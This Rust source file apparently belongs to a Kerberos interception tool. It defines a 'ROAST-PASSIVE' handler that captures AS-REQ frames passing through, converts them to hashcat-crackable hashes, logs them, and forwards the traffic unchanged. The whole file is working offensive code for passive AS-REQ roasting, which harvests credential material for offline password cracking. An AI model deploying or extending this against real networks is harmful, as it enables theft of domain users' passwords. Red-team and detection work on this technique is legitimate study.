use kile::{roast::Roastable, KdcFrame};
use tracing::{info, warn};

use super::{Handler, HandlerAction};

#[derive(Clone, Copy)]
pub struct RoastPassiveHandler;

impl RoastPassiveHandler {
    pub fn new() -> Self {
        Self {}
    }
}

impl Handler for RoastPassiveHandler {
    fn name(&self) -> &'static str {
        "ROAST-PASSIVE"
    }

    fn handle_downstream(&mut self, frame: KdcFrame) -> HandlerAction {
        match &frame {
            KdcFrame::AsReq(as_req) => {
                if let Ok(hash) = as_req.dump_to_hashcat() {
                    info!("Received AS_REQ with {}", hash);
                } else {
                    warn!("Failed to dump AS_REQ to hashcat format");
                }
                HandlerAction::Forward(frame)
            }
            _ => HandlerAction::Forward(frame),
        }
    }

    fn handle_upstream(&mut self, frame: KdcFrame) -> HandlerAction {
        match &frame {
            _ => HandlerAction::Forward(frame),
        }
    }
}
